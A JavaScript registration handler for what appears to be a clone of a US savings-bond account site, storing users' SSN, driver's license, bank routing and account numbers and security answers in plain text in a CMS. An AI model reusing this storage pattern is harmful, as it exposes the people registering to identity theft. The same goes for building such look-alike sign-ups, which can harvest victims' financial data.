import bcrypt from 'bcryptjs';
import {
  sanity,
  signSession,
  sessionCookie,
  json,
  fail,
  randomAccountNumber,
  randomUserId,
  verifyTurnstile,
} from './_lib.mjs';

export const handler = async (event) => {
  if (event.httpMethod !== 'POST') return fail('Method not allowed', 405);

  let data;
  try {
    data = JSON.parse(event.body || '{}');
  } catch (_) {
    return fail('Invalid request body');
  }

  const email = String(data.email || '').trim().toLowerCase();
  const password = String(data.password || '');
  const firstName = String(data.firstName || '').trim();
  const middleName = String(data.middleName || '').trim();
  const lastName = String(data.lastName || '').trim();

  if (!email || !password) return fail('Email and password are required');
  if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) return fail('Invalid email format');

  const pwOk =
    password.length >= 8 &&
    /[A-Z]/.test(password) &&
    /[a-z]/.test(password) &&
    /\d/.test(password) &&
    /[^A-Za-z0-9]/.test(password);
  if (!pwOk) {
    return fail('Password must be at least 8 characters and include an uppercase, a lowercase, a number and a special character');
  }

  const humanOk = await verifyTurnstile(data.turnstileToken);
  if (!humanOk) return fail('Human verification failed. Please try again.');

  const client = sanity();

  try {
    const existing = await client.fetch(
      '*[_type == "accountHolder" && email == $email][0]._id',
      { email }
    );
    if (existing) return fail('Email already registered');

    const accountNumber = randomAccountNumber();
    const userId = randomUserId();
    const fullName = [firstName, middleName, lastName].filter(Boolean).join(' ') || String(data.name || '').trim();

    const doc = {
      _id: 'accountHolder-' + accountNumber.toLowerCase(),
      _type: 'accountHolder',
      userId,
      firstName,
      middleName,
      lastName,
      fullName,
      email,
      accountNumber,
      passwordHash: await bcrypt.hash(password, 12),
      createdAt: new Date().toISOString(),
      accountType: data.accountType || 'Individual',
      dob: data.dob || '',
      phone: data.phone || '',
      driversLicense: data.driversLicense || '',
      dlState: data.dlState || '',
      ssn: data.ssn || '',
      street: data.street || '',
      apt: data.apt || '',
      city: data.city || '',
      stateAddress: data.stateAddress || data.stateAddr || '',
      zip: data.zip || '',
      country: data.country || 'United States',
      bankAcctType: data.bankAcctType || data.acctType || '',
      routingNumber: data.routing || '',
      bankAccountNumber: data.accountNum || '',
      bankName: data.bankName || '',
      secImage: data.secImage || '',
      imageCaption: data.imageCaption || '',
      passwordReminder: data.passwordReminder || '',
      secQ1: data.secQ1 || '',
      secA1: data.secA1 || '',
      secQ2: data.secQ2 || '',
      secA2: data.secA2 || '',
      secQ3: data.secQ3 || '',
      secA3: data.secA3 || '',
      portfolioValue: 0,
      interestEarnedYTD: 0,
      pendingOrders: 0,
      accounts: [],
      eeBondRate: '2.40%',
      iBondRate: '4.26%',
      portfolioYield: '3.42%',
      interestThisYear: 0,
    };

    await client.create(doc);

    const token = signSession({ sub: userId, email, name: fullName, accountNumber });

    return json(
      200,
      { success: true, userId, email, accountNumber, redirect: '/dashboard/' },
      { 'Set-Cookie': sessionCookie(token, event) }
    );
  } catch (err) {
    console.error('register error', err);
    return fail('Could not create your account. Please try again.', 500);
  }
};
